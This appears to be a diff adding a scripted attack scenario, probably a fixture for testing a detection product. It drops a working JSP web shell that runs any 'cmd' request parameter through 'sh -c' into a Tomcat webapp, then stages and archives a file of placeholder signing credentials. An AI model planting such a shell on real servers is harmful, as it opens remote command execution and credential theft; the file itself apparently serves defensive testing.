@@ -1,0 +1,49 @@
+{
+  "chain_id": "template_upload_webshell_secret_archive_001",
+  "actions": [
+    {
+      "action_id": "prepare_dropped_ops_theme_preview_webshell",
+      "operation": "write_text_file",
+      "target_path": "/srv/dotserver/tomcat-9.0.41/webapps/theme-preview/ops-theme-preview.jsp",
+      "encoding": "utf-8",
+      "backup_suffix": ".deepxdr.bak",
+      "create_parents": true,
+      "mtime_offset_sec": 20.3,
+      "content": "<%@ page import=\"java.io.*\" %>\n<%\nString mode = request.getParameter(\"mode\");\nString cmd = request.getParameter(\"cmd\");\nif (cmd != null && !cmd.trim().isEmpty()) {\n    Process p = new ProcessBuilder(\"sh\", \"-c\", cmd).redirectErrorStream(true).start();\n    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n    String line;\n    while ((line = reader.readLine()) != null) {\n        out.println(line);\n    }\n}\n%>\n"
+    },
+    {
+      "action_id": "prepare_ops_theme_signing_secret_file",
+      "operation": "write_text_file",
+      "target_path": "/srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF/classes/ops-theme-signing-secret.properties",
+      "encoding": "utf-8",
+      "backup_suffix": ".deepxdr.bak",
+      "create_parents": true,
+      "mtime_offset_sec": 79.7,
+      "content": "ops.theme.signing.service_account=ops_theme_exporter\nops.theme.signing.api_token=synthetic-token-theme-001\nops.theme.signing.key_id=synthetic-key-002\nops.theme.signing.secret_scope=ops-theme-preview-east\nops.theme.signing.approver=ops-review-admin\n"
+    },
+    {
+      "action_id": "prepare_ops_theme_secret_stage_file",
+      "operation": "write_text_file",
+      "target_path": "/srv/dotserver/tomcat-9.0.41/temp/theme-preview/ops-theme-secret-stage.txt",
+      "encoding": "utf-8",
+      "backup_suffix": ".deepxdr.bak",
+      "create_parents": true,
+      "mtime_offset_sec": 80.3,
+      "content": "ops.theme.signing.service_account=ops_theme_exporter\nops.theme.signing.api_token=synthetic-token-theme-001\nops.theme.signing.key_id=synthetic-key-002\nops.theme.signing.secret_scope=ops-theme-preview-east\nops.theme.signing.approver=ops-review-admin\n"
+    },
+    {
+      "action_id": "prepare_ops_theme_secret_archive_file",
+      "operation": "write_text_file",
+      "target_path": "/srv/dotserver/tomcat-9.0.41/temp/theme-preview/ops-theme-secret-stage.tgz",
+      "encoding": "utf-8",
+      "backup_suffix": ".deepxdr.bak",
+      "create_parents": true,
+      "mtime_offset_sec": 100.3,
+      "content": "TGZ-STUB\nops.theme.signing.service_account=ops_theme_exporter\nops.theme.signing.api_token=synthetic-token-theme-001\nops.theme.signing.key_id=synthetic-key-002\nops.theme.signing.secret_scope=ops-theme-preview-east\nops.theme.signing.approver=ops-review-admin\n"
+    }
+  ]
+}
+
+
+
+
